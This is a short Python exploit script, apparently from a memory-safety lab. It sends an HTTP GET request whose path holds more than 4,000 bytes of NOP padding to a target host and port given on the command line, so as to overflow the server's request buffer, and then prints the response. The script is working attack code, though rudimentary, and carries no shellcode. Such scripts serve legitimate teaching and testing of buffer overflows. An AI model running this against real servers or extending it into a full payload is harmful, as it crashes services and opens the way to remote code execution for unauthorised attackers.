#!/usr/bin/env python3

import sys
import socket
import traceback
import urllib.parse
import struct

def build_exploit(payload):
    req =   b"GET /" + payload + b" HTTP/1.0\r\n" + \
            b"\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

def create_padding(pad_len, pad_byte = b'\x90'):
    padding = b''
    for i in range(pad_len):
        padding = padding + pad_byte
    return padding

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    req = build_exploit(create_padding(4096 + 8 + 8 + 7))
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())